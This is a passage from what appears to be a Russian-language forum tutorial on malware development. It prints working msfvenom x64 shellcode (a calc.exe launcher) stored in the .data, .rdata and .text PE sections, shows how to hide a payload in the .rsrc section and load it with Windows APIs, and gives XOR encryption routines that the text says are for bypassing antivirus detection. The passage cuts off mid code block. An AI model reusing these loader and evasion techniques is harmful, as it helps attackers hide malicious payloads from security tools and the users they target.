		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// .data saved payload
unsigned char Data_RawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

    printf(&quot;[i] Data_RawData var : 0x%p \n&quot;, Data_RawData);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
Изображение ниже показывает результат работы вышеуказанного фрагмента кода в xdbg.<br />
<br />
Обратите внимание на несколько пунктов на изображении:<br />
<br />
Раздел .data начинается с адреса 0x00007FF7B7603000.<br />
Базовый адрес Data_RawData равен 0x00007FF7B7603040, что является смещением на 0x40 от раздела .data.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732328348.png"
		data-src="https://osint42.org/attachments/1746732328348-png.58/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732328348-png.58/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732328348.png"
			title="1746732328348.png"
			width="975" height="226" loading="lazy" />
	</div><br />
<br />
<b>Раздел .rdata</b><br />
<br />
Переменные, определенные с квалификатором const, записываются как константы. Такие переменные считаются данными &quot;только для чтения&quot;. Буква &quot;r&quot; в .rdata указывает на это, и любая попытка изменить эти переменные приведет к нарушению доступа. Кроме того, в зависимости от компилятора и его настроек, разделы .data и .rdata могут быть объединены, или даже объединены с разделом .text.<br />
<br />
Приведенный ниже фрагмент кода показывает пример того, как полезная нагрузка хранится в разделе .rdata. Код по сути будет таким же, как в предыдущем фрагменте кода, за исключением того, что переменная теперь предварена квалификатором const.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// .rdata saved payload
const unsigned char Rdata_RawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

    printf(&quot;[i] Rdata_RawData var : 0x%p \n&quot;, Rdata_RawData);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
Изображение ниже показывает результат выполнения команды dumpbin.exe на файле PE. Установка среды выполнения C++ Visual Studio автоматически загрузит dumpbin.exe.<br />
<br />
Команда: dumpbin.exe /ALL &lt;binary-file.exe&gt;<br />
<br />
Прокрутите вниз и посмотрите детали раздела .rdata, который содержит данные, сохраненные в исходном двоичном формате.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732339823.png"
		data-src="https://osint42.org/attachments/1746732339823-png.59/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732339823-png.59/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732339823.png"
			title="1746732339823.png"
			width="960" height="495" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732346734.png"
		data-src="https://osint42.org/attachments/1746732346734-png.60/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732346734-png.60/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732346734.png"
			title="1746732346734.png"
			width="975" height="469" loading="lazy" />
	</div><br />
<br />
<b>Раздел .text </b><br />
<br />
В разделе .text компилятор сохраняет код программы.<br />
<br />
<b>Поэтому </b>Сохранение переменных в разделе .text отличается от их сохранения в разделах .data или .rdata.<br />
Здесь речь не идет просто о объявлении случайной переменной. Нужно указать компилятору сохранить ее в разделе .text, что демонстрируется в приведенном ниже фрагменте кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// .text saved payload
#pragma section(&quot;.text&quot;)__declspec(allocate(&quot;.text&quot;)) const unsigned char Text_RawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

    printf(&quot;[i] Text_RawData var : 0x%p \n&quot;, Text_RawData);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
Здесь компилятору указано разместить переменную Text_rawData в разделе .text вместо раздела .rdata.<b><u> <br />
<br />
Особенность раздела .text заключается в том, что он хранит переменные с правами на выполнение в памяти</u></b>, позволяя их выполнение напрямую без необходимости редактирования прав доступа к региону памяти. Это полезно для небольших полезных нагрузок, размер которых примерно меньше 10 байт.<br />
<br />
При изучении двоичного файла, скомпилированного из приведенного выше фрагмента кода с помощью инструмента PE-Bear, видно, что полезная нагрузка находится в регионе .text.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732357009.png"
		data-src="https://osint42.org/attachments/1746732357009-png.61/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732357009-png.61/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732357009.png"
			title="1746732357009.png"
			width="975" height="561" loading="lazy" />
	</div><br />
<br />
<b>Раздел .rsrc</b><br />
<br />
Сохранение полезной нагрузки в разделе .rsrc является одним из лучших вариантов, так как именно здесь большинство реальных двоичных файлов сохраняют свои данные. Это также более чистый метод для авторов вредоносных программ, поскольку большие полезные нагрузки не могут быть сохранены в разделах .data или .rdata из-за ограничений по размеру, что приводит к ошибкам от Visual Studio во время компиляции.<br />
<br />
Ниже приведены шаги по сохранению полезной нагрузки в разделе .rsrc.<br />
<br />
1.Внутри Visual Studio щелкните правой кнопкой мыши на &#039;Resource files&#039; (Ресурсные файлы), затем выберите Add (Добавить) &gt; New Item (Новый элемент).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732364447.png"
		data-src="https://osint42.org/attachments/1746732364447-png.62/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732364447-png.62/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732364447.png"
			title="1746732364447.png"
			width="973" height="628" loading="lazy" />
	</div><br />
<br />
<br />
2.Кликните на &#039;Resource File&#039;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732378875.png"
		data-src="https://osint42.org/attachments/1746732378875-png.63/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732378875-png.63/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732378875.png"
			title="1746732378875.png"
			width="973" height="677" loading="lazy" />
	</div><br />
<br />
3. Это действие вызовет новую боковую панель, &quot;Просмотр ресурсов&quot; (Resource View). Щелкните правой кнопкой мыши на файле .rc (по умолчанию имя файла - Resource.rc) и выберите опцию &quot;Добавить ресурс&quot; (&#039;Add Resource&#039;).<br />
Продолжите следовать инструкциям, чтобы завершить добавление вашего ресурса в раздел .rsrc. Обычно после этого шага вам предложат выбрать тип ресурса, который вы хотите добавить (например, иконка, изображение, строка и т. д.), а затем предоставить соответствующие данные или файлы для этого ресурса.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732400776.png"
		data-src="https://osint42.org/attachments/1746732400776-png.64/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732400776-png.64/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732400776.png"
			title="1746732400776.png"
			width="711" height="702" loading="lazy" />
	</div><br />
<br />
4. Кликните на &#039;Import&#039;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732413812.png"
		data-src="https://osint42.org/attachments/1746732413812-png.65/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732413812-png.65/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732413812.png"
			title="1746732413812.png"
			width="970" height="720" loading="lazy" />
	</div><br />
<br />
5. Выберите файл calc.ico, который является исходной полезной нагрузкой, переименованной с расширением .ico.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732427731.png"
		data-src="https://osint42.org/attachments/1746732427731-png.66/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732427731-png.66/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732427731.png"
			title="1746732427731.png"
			width="973" height="555" loading="lazy" />
	</div><br />
<br />
6. Появится запрос на указание типа ресурса. Введите &quot;RCDATA&quot; без кавычек.<br />
Примечание: &quot;RCDATA&quot; - это стандартный тип ресурса в Windows для хранения произвольных данных в двоичном формате.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732438564.png"
		data-src="https://osint42.org/attachments/1746732438564-png.67/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732438564-png.67/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732438564.png"
			title="1746732438564.png"
			width="973" height="839" loading="lazy" />
	</div><br />
<br />
7. После нажатия кнопки ОК полезная нагрузка должна отображаться в исходном двоичном формате внутри проекта Visual Studio.<br />
Убедитесь, что вы проверили ресурсный файл и удостоверились, что он содержит ожидаемые данные. Если все выполнено правильно, вы сможете увидеть свою полезную нагрузку внутри файла ресурсов и, при необходимости, использовать ее в дальнейших этапах разработки.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732459557.png"
		data-src="https://osint42.org/attachments/1746732459557-png.68/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732459557-png.68/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732459557.png"
			title="1746732459557.png"
			width="973" height="566" loading="lazy" />
	</div><br />
<br />
8. При выходе из &quot;Просмотра ресурсов&quot; (Resource View) должен быть виден заголовочный файл &quot;resource.h&quot;, который назван в соответствии с файлом .rc из шага 2. Этот файл содержит оператор define, который ссылается на идентификатор полезной нагрузки в разделе ресурсов (IDR_RCDATA1). Это важно, чтобы в дальнейшем иметь возможность извлечь полезную нагрузку из раздела ресурсов.<br />
Убедитесь, что у вас есть доступ к этому идентификатору, когда вы будете извлекать полезную нагрузку из вашего исполняемого файла.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732470179.png"
		data-src="https://osint42.org/attachments/1746732470179-png.69/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732470179-png.69/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732470179.png"
			title="1746732470179.png"
			width="975" height="658" loading="lazy" />
	</div><br />
<br />
После компиляции полезная нагрузка теперь будет храниться в разделе .rsrc, но к ней нельзя будет обратиться напрямую. Вместо этого необходимо использовать несколько WinAPI для доступа к ней.<br />
<br />
FindResourceW - получить местоположение указанных данных, сохраненных в разделе ресурсов с особым переданным ID (он определен в заголовочном файле).<br />
LoadResource - получает дескриптор HGLOBAL данных ресурса. Этот дескриптор может быть использован для получения базового адреса указанного ресурса в памяти.<br />
LockResource - получает указатель на указанные данные в разделе ресурсов по его дескриптору.<br />
SizeofResource - получает размер указанных данных в разделе ресурсов. Ниже приведен фрагмент кода, который использует вышеупомянутые Windows API для доступа к разделу .rsrc и извлечения адреса и размера полезной нагрузки.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;resource.h&quot;int main() {

    HRSRC        hRsrc                   = NULL;
    HGLOBAL        hGlobal                 = NULL;
    PVOID        pPayloadAddress         = NULL;
    SIZE_T        sPayloadSize            = NULL;


    // Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
    hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hRsrc == NULL) {
        // in case of function failure
        printf(&quot;[!] FindResourceW Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        // in case of function failure
        printf(&quot;[!] LoadResource Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Get the address of our payload in .rsrc section
    pPayloadAddress = LockResource(hGlobal);
    if (pPayloadAddress == NULL) {
        // in case of function failure
        printf(&quot;[!] LockResource Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Get the size of our payload in .rsrc section
    sPayloadSize = SizeofResource(NULL, hRsrc);
    if (sPayloadSize == NULL) {
        // in case of function failure
        printf(&quot;[!] SizeofResource Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Printing pointer and size to the screen
    printf(&quot;[i] pPayloadAddress var : 0x%p \n&quot;, pPayloadAddress);
    printf(&quot;[i] sPayloadSize var : %ld \n&quot;, sPayloadSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
После компиляции и запуска приведенного выше кода адрес полезной нагрузки вместе с ее размером будет выведен на экран. Важно отметить, что этот адрес находится в разделе .rsrc, который представляет собой память только для чтения, и любые попытки изменить или редактировать данные внутри него приведут к ошибке нарушения доступа. Для редактирования полезной нагрузки необходимо выделить буфер такого же размера, как полезная нагрузка, и скопировать его. В этом новом буфере можно вносить изменения, такие как дешифрование полезной нагрузки.<br />
<br />
<b>Обновление полезной нагрузки в .rsrc</b><br />
<br />
Поскольку полезную нагрузку нельзя напрямую редактировать из раздела ресурсов, ее необходимо переместить во временный буфер.<br />
Для этого память выделяется размером полезной нагрузки с использованием HeapAlloc, а затем полезная нагрузка перемещается из раздела ресурсов в временный буфер с использованием memcpy.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Allocating memory using a HeapAlloc call
PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
if (pTmpBuffer != NULL){
    // copying the payload from resource section to the new buffer
    memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
}

// Printing the base address of our buffer (pTmpBuffer)
printf(&quot;[i] pTmpBuffer var : 0x%p \n&quot;, pTmpBuffer);</code></pre>
	</div>
</div><br />
Так как pTmpBuffer теперь указывает на область памяти, в которой можно записывать и которая содержит полезную нагрузку, становится возможным расшифровать полезную нагрузку или внести в нее любые обновления.<br />
<br />
Изображение ниже показывает shellcode Msfvenom, сохраненный в разделе ресурсов.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732483536.png"
		data-src="https://osint42.org/attachments/1746732483536-png.70/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732483536-png.70/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732483536.png"
			title="1746732483536.png"
			width="1660" height="1080" loading="lazy" />
	</div><br />
<br />
Продолжая выполнение, полезная нагрузка сохраняется во временном буфере.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732512417.png"
		data-src="https://osint42.org/attachments/1746732512417-png.71/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732512417-png.71/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732512417.png"
			title="1746732512417.png"
			width="1533" height="1076" loading="lazy" />
	</div></div>
						

							<h2>Шифруем Payload</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746773556787.png"
		data-src="https://osint42.org/attachments/1746773556787-png.72/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773556787-png.72/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773556787.png"
			title="1746773556787.png"
			width="450" height="230" loading="lazy" />
	</div><br />
<br />
В предыдущей статье мы рассмотрели где хранить полезную нагрузку (Payload), но как было сказано в коментарии к статье, для обхода детекта нужно много чего сделать, в частности нужно зашифровать Payload и ещё позаботится об антиэмуляции и скрытия поведения.<br />
<br />
В этой статье рассмотрим пока-что как шифровать.)<br />
<br />
<b>Шифрование с использованием XOR</b><br />
<br />
Шифрование с использованием XOR является самым простым в использовании и легким в реализации, что делает его популярным выбором для вредоносных программ. Оно быстрее, чем AES и RC4, и не требует дополнительных библиотек или использования API Windows. Кроме того, это симметричный алгоритм шифрования, который позволяет использовать одну и ту же функцию как для шифрования, так и для дешифрования.<br />
<br />
<b>Шифрование XOR</b> Приведенный ниже фрагмент кода показывает базовую функцию шифрования XOR. Функция просто применяет операцию XOR к каждому байту шеллкода с 1-байтовым ключом.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
    - pShellcode : Base address of the payload to encrypt
    - sShellcodeSize : The size of the payload
    - bKey : A single arbitrary byte representing the key for encrypting the payload
*/
VOID XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
    for (size_t i = 0; i &lt; sShellcodeSize; i++){
        pShellcode[i] = pShellcode[i] ^ bKey;
    }
}</code></pre>
	</div>
</div><br />
<b>Дополнение:</b> Хотя XOR обладает определенными преимуществами в виде скорости и простоты, он не считается безопасным для большинства серьезных приложений шифрования. Если атакующий имеет доступ к исходному и зашифрованному текстам, он может легко восстановить ключ. Кроме того, если один и тот же ключ используется многократно, это также может привести к уязвимостям.<br />
<br />
<b>Защита ключа шифрования</b><br />
<br />
Некоторые инструменты и решения по безопасности могут подбирать ключ методом грубой силы, что позволит расшифровать шеллкод. Чтобы усложнить подбор ключа этим инструментам, приведенный ниже код вносит незначительные изменения, увеличивая ключевое пространство за счет добавления переменной i к ключу. Теперь, когда ключевое пространство значительно больше, гораздо сложнее подобрать ключ методом грубой силы.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
    - pShellcode : Базовый адрес полезной нагрузки для шифрования
    - sShellcodeSize : Размер полезной нагрузки
    - bKey : Один произвольный байт, представляющий ключ для шифрования полезной нагрузки
*/
VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
    for (size_t i = 0; i &lt; sShellcodeSize; i++) {
        pShellcode[i] = pShellcode[i] ^ (bKey + i);
    }
}</code></pre>
	</div>
</div><br />
Приведенный выше фрагмент кода все же можно сделать более надежным. В следующем фрагменте кода процесс шифрования осуществляется с ключом, используя каждый байт ключа повторно, что усложняет взлом ключа.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*
    - pShellcode : Базовый адрес полезной нагрузки для шифрования
    - sShellcodeSize : Размер полезной нагрузки
    - bKey : Случайный массив байтов определенного размера
    - sKeySize : Размер ключа
*/
